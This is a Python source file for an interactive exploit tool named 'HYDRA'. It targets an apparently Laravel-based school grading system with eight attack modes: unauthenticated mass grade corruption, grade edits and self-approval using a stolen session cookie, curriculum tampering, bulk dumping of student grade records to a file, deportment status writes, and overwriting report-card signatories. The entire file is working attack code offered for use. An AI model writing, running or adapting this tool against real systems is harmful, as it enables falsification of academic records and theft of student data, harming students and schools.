import sys
import json
import requests
from tqdm import tqdm

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CYAN    = "\033[96m"
GREEN   = "\033[92m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
MAGENTA = "\033[95m"
DIM     = "\033[90m"
BOLD    = "\033[1m"
RESET   = "\033[0m"

BANNER = rf"""
{MAGENTA}   ╔═══════════════════════════════════════════════╗
   ║  {BOLD}HYDRA{RESET}{MAGENTA}  — College & Principal Grade Exploit   ║
   ║  C-01→C-06 | PR-02→PR-04 | T-06 | Grades   ║
   ╚═══════════════════════════════════════════════╝{RESET}
"""

def menu():
    return f"""
  {CYAN}[1]{RESET} Unauthenticated grade corruption (column inject) {DIM}(C-01){RESET}
  {CYAN}[2]{RESET} Modify K-12 grades as any user                   {DIM}(C-02){RESET}
  {CYAN}[3]{RESET} Self-approve + post final grade                   {DIM}(C-03){RESET}
  {CYAN}[4]{RESET} Remove/add subject in curriculum                  {DIM}(C-04){RESET}
  {CYAN}[5]{RESET} Unauthenticated grade status submission           {DIM}(C-05){RESET}
  {CYAN}[6]{RESET} Unauthenticated college grade dump                {DIM}(C-06){RESET}
  {CYAN}[7]{RESET} Unauthenticated deportment status write           {DIM}(PR-02/T-06){RESET}
  {CYAN}[8]{RESET} Overwrite SF9 signatory (any session)             {DIM}(PR-04){RESET}
  {DIM}[0]{RESET} Exit
"""

# ── MODE 1: Grade corruption via /teacher/update/hps ──────────────────────────
def mode_grade_corrupt(base_url):
    print(f"  {DIM}Columns: qg (quarterly), pthps, wwhps0-wwhps9, submitted, etc.{RESET}")
    grade_id = input(f"  {CYAN}[?]{RESET} grades.id (or range e.g. 1-50): ").strip()
    column   = input(f"  {CYAN}[?]{RESET} Column to write: ").strip() or "qg"
    value    = input(f"  {CYAN}[?]{RESET} Value to set: ").strip() or "100"
    
    if "-" in grade_id:
        start, end = map(int, grade_id.split("-"))
        ids = range(start, end + 1)
    else:
        ids = [int(grade_id)]
    
    for gid in tqdm(ids, desc="Corrupting", ncols=80):
        r = requests.get(f"{base_url}/teacher/update/hps",
                         params={"a": gid, "b": column, "c": value}, timeout=5)
    print(f"  {GREEN}[+]{RESET} Set {column}={value} on {len(list(ids))} grade records (NO AUTH)")

# ── MODE 2: Modify grades as any user ─────────────────────────────────────────
def mode_modify_grades(base_url):
    session = input(f"  {CYAN}[?]{RESET} laravel_session cookie: ").strip()
    gd_id   = input(f"  {CYAN}[?]{RESET} gradesdetail ID: ").strip()
    score   = input(f"  {CYAN}[?]{RESET} Score to set (all components): ").strip() or "100"
    grades_id = input(f"  {CYAN}[?]{RESET} grades ID (HPS ref): ").strip() or gd_id
    
    params = {
        "inputedData[0][0]": gd_id,
        "inputedData[0][1]": score, "inputedData[0][2]": score,
        "inputedData[0][11]": score, "inputedData[0][21]": score,
        "inputedData[0][25]": score, "inputedData[0][26]": score,
        "inputedDataHPS[0][0]": grades_id,
    }
    r = requests.get(f"{base_url}/teacher/update/grades", params=params,
                     cookies={"laravel_session": session}, timeout=10)
    if r.text.strip() == "1":
        print(f"  {GREEN}[+]{RESET} Grades updated — all components set to {score}")
    else:
        print(f"  {RED}[-]{RESET} Response: {r.text[:200]}")

# ── MODE 3: Self-approve + post ───────────────────────────────────────────────
def mode_self_approve(base_url):
    session   = input(f"  {CYAN}[?]{RESET} laravel_session cookie: ").strip()
    header_id = input(f"  {CYAN}[?]{RESET} Grade header ID: ").strip()
    syid      = input(f"  {CYAN}[?]{RESET} SY ID: ").strip() or "1"
    semid     = input(f"  {CYAN}[?]{RESET} Semester ID: ").strip() or "1"
    schedid   = input(f"  {CYAN}[?]{RESET} Schedule ID: ").strip() or "1"
    term      = input(f"  {CYAN}[?]{RESET} Term (MIDTERM/FINAL): ").strip() or "FINAL"
    
    cookies = {"laravel_session": session}
    base_params = {"id": header_id, "syid": syid, "semid": semid, "schedid": schedid, "term": term}
    
    steps = [
        ("submit", "/college/grade/ecr/submit"),
        ("approve", "/college/grade/ecr/approve"),
        ("post", "/college/grade/ecr/post"),
    ]
    for step_name, endpoint in steps:
        r = requests.get(f"{base_url}{endpoint}", params=base_params,
                         cookies=cookies, timeout=10)
        print(f"  {GREEN}[+]{RESET} {step_name}: HTTP {r.status_code} — {r.text[:80]}")

# ── MODE 4: Remove/add subject from curriculum ────────────────────────────────
def mode_curriculum(base_url):
    session = input(f"  {CYAN}[?]{RESET} laravel_session cookie: ").strip()
    action  = input(f"  {CYAN}[?]{RESET} Action (remove/add): ").strip().lower() or "remove"
    
    cookies = {"laravel_session": session}
    if action == "remove":
        subj_id = input(f"  {CYAN}[?]{RESET} Subject ID to remove: ").strip()
        r = requests.get(f"{base_url}/dean/remove/prospectussubject/{subj_id}",
                         cookies=cookies, timeout=10)
        print(f"  {GREEN}[+]{RESET} Removed subject {subj_id} — HTTP {r.status_code}")
    else:
        subj_id  = input(f"  {CYAN}[?]{RESET} Subject ID: ").strip()
        course_id = input(f"  {CYAN}[?]{RESET} Course ID: ").strip() or "1"
        year_id   = input(f"  {CYAN}[?]{RESET} Year ID: ").strip() or "1"
        sem_id    = input(f"  {CYAN}[?]{RESET} Semester ID: ").strip() or "1"
        units     = input(f"  {CYAN}[?]{RESET} Units: ").strip() or "3"
        r = requests.get(f"{base_url}/dean/store/prospectus",
                         params={"subjectID": subj_id, "courseID": course_id,
                                 "yearID": year_id, "semesterID": sem_id, "units": units},
                         cookies=cookies, timeout=10)
        print(f"  {GREEN}[+]{RESET} Added subject — HTTP {r.status_code}")

# ── MODE 5: Unauthenticated grade status submission ───────────────────────────
def mode_grade_status(base_url):
    status_id = input(f"  {CYAN}[?]{RESET} Status ID (or range): ").strip()
    field     = input(f"  {CYAN}[?]{RESET} Data field value (e.g. submitted): ").strip() or "submitted"
    
    if "-" in status_id:
        start, end = map(int, status_id.split("-"))
        ids = range(start, end + 1)
    else:
        ids = [int(status_id)]
    
    for sid in tqdm(ids, desc="Submitting", ncols=80):
        requests.get(f"{base_url}/college/student/grade/status/submit",
                     params={"statusid": sid, "datafield": field}, timeout=5)
    print(f"  {GREEN}[+]{RESET} Grade status set to '{field}' for {len(list(ids))} records (NO AUTH)")

# ── MODE 6: Unauthenticated college grade dump ────────────────────────────────
def mode_grade_dump(base_url):
    syid   = input(f"  {CYAN}[?]{RESET} SY ID: ").strip() or "1"
    semid  = input(f"  {CYAN}[?]{RESET} Semester ID: ").strip() or "1"
    sec_range = input(f"  {CYAN}[?]{RESET} Section ID range (e.g. 1-20): ").strip() or "1-20"
    subj_range = input(f"  {CYAN}[?]{RESET} Subject ID range (e.g. 1-10): ").strip() or "1-10"
    
    s_start, s_end = map(int, sec_range.split("-"))
    sub_start, sub_end = map(int, subj_range.split("-"))
    
    all_data = []
    total = (s_end - s_start + 1) * (sub_end - sub_start + 1)
    
    with tqdm(total=total, desc="Dumping", ncols=80) as pbar:
        for sec in range(s_start, s_end + 1):
            for subj in range(sub_start, sub_end + 1):
                pbar.update(1)
                try:
                    r = requests.get(f"{base_url}/college/subject/students",
                                     params={"syid": syid, "semid": semid,
                                             "sectionid": sec, "subjid": subj}, timeout=5)
                    data = r.json()
                    if data:
                        tqdm.write(f"  {GREEN}[+]{RESET} Section {sec} / Subject {subj}: {len(data)} students")
                        all_data.extend(data)
                except:
                    pass
    
    print(f"\n  {CYAN}[i]{RESET} Total grade records found: {BOLD}{len(all_data)}{RESET}")
    if all_data:
        out = input(f"  {CYAN}[?]{RESET} Save to (filename or N): ").strip()
        if out and out.lower() != "n":
            with open(out, "w", encoding="utf-8") as f:
                json.dump(all_data, f, indent=2, default=str)
            print(f"  {GREEN}[+]{RESET} Saved to {out}")

# ── MODE 7: Deportment status write ───────────────────────────────────────────
def mode_deportment(base_url):
    print(f"  {DIM}Status: 1=Not Submitted 3=Approved 5=Posted{RESET}")
    stud_ids = input(f"  {CYAN}[?]{RESET} Student IDs (comma or range): ").strip()
    syid     = input(f"  {CYAN}[?]{RESET} SY ID: ").strip() or "1"
    sec_id   = input(f"  {CYAN}[?]{RESET} Section ID: ").strip() or "1"
    quarter  = input(f"  {CYAN}[?]{RESET} Quarter: ").strip() or "1"
    status   = input(f"  {CYAN}[?]{RESET} Status to set (5=Posted): ").strip() or "5"
    
    if "-" in stud_ids:
        start, end = map(int, stud_ids.split("-"))
        ids = list(range(start, end + 1))
    else:
        ids = [int(x.strip()) for x in stud_ids.split(",") if x.strip()]
    
    params = {"syid": syid, "sectionid": sec_id, "quarter_ID": quarter,
              "status": status, "hpsid": "1"}
    for i, sid in enumerate(ids):
        params[f"array[{i}]"] = sid  # fix: use indexed array params
    # Actually the endpoint uses array[]=val&array[]=val format
    array_params = "&".join(f"array[]={sid}" for sid in ids)
    base_params = f"syid={syid}&sectionid={sec_id}&quarter_ID={quarter}&status={status}&hpsid=1"
    
    r = requests.get(f"{base_url}/posting/grade/update-grade-status?{array_params}&{base_params}",
                     timeout=10)
    try:
        data = r.json()
        if data[0].get("statusCode") == "success":
            print(f"  {GREEN}[+]{RESET} Deportment set to status={status} for {len(ids)} students (NO AUTH)")
        else:
            print(f"  {YELLOW}[?]{RESET} Response: {data}")
    except:
        print(f"  {RED}[-]{RESET} HTTP {r.status_code}: {r.text[:200]}")

# ── MODE 8: Overwrite SF9 signatory ───────────────────────────────────────────
def mode_signatory(base_url):
    session = input(f"  {CYAN}[?]{RESET} laravel_session cookie: ").strip()
    syid    = input(f"  {CYAN}[?]{RESET} SY ID: ").strip() or "1"
    
    cookies = {"laravel_session": session}
    
    # List current signatories
    r = requests.get(f"{base_url}/setup/signatories/list/sf9",
                     params={"syid": syid}, cookies=cookies, timeout=10)
    try:
        sigs = r.json()
        print(f"  {DIM}[*] Current signatories:{RESET}")
        for s in sigs:
            print(f"      ID={s.get('id')} | {s.get('name')} | {s.get('title')}")
    except:
        print(f"  {DIM}[*] Could not list current signatories{RESET}")
    
    action = input(f"  {CYAN}[?]{RESET} Action (overwrite/delete): ").strip().lower() or "overwrite"
    sig_id = input(f"  {CYAN}[?]{RESET} Signatory ID: ").strip() or "1"
    
    if action == "delete":
        r = requests.get(f"{base_url}/setup/signatories/delete/sf9",
                         params={"id": sig_id}, cookies=cookies, timeout=10)
        print(f"  {GREEN}[+]{RESET} Deleted signatory {sig_id}")
    else:
        name  = input(f"  {CYAN}[?]{RESET} New name: ").strip() or "PWNED"
        title = input(f"  {CYAN}[?]{RESET} New title: ").strip() or "Unauthorized"
        r = requests.get(f"{base_url}/setup/signatories/update/sf9",
                         params={"id": sig_id, "name": name, "title": title,
                                 "acadprogid": "3", "syid": syid},
                         cookies=cookies, timeout=10)
        print(f"  {GREEN}[+]{RESET} Signatory {sig_id} overwritten → {name} / {title}")

# ── MAIN ──────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print(BANNER)
    BASE_URL = input(f"  {CYAN}[?]{RESET} Target URL: ").strip().rstrip("/")
    
    while True:
        print(menu())
        choice = input(f"  {DIM}┌─[hydra]─[~]{RESET}\n  {DIM}└──╼ ${RESET} ").strip()
        
        if choice == "0": break
        elif choice == "1": mode_grade_corrupt(BASE_URL)
        elif choice == "2": mode_modify_grades(BASE_URL)
        elif choice == "3": mode_self_approve(BASE_URL)
        elif choice == "4": mode_curriculum(BASE_URL)
        elif choice == "5": mode_grade_status(BASE_URL)
        elif choice == "6": mode_grade_dump(BASE_URL)
        elif choice == "7": mode_deportment(BASE_URL)
        elif choice == "8": mode_signatory(BASE_URL)
        else: print(f"  {RED}[!]{RESET} Invalid choice")
    
    print(f"\n  {DIM}[*] HYDRA session ended{RESET}\n")
